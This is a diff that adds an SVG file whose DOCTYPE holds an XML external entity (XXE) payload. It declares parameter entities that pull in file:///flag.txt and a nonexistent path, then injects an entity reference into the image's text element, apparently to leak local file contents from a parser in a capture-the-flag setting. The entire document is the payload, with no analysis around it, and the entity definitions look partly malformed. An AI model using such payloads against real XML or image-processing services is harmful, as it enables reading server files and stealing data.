@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ 
+  <!ENTITY % local_dtd SYSTEM "file:///flag.txt">
+  <!ENTITY % condition '<!ENTITY &#x25; test "test">
+                        <!ENTITY &#x26; external SYSTEM "file:///doesnt_exist/">'>
+  %local_dtd;
+  %condition;
+  %test;
+]>
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+  <text x="0" y="20" font-size="20">&external;</text>
+</svg> 
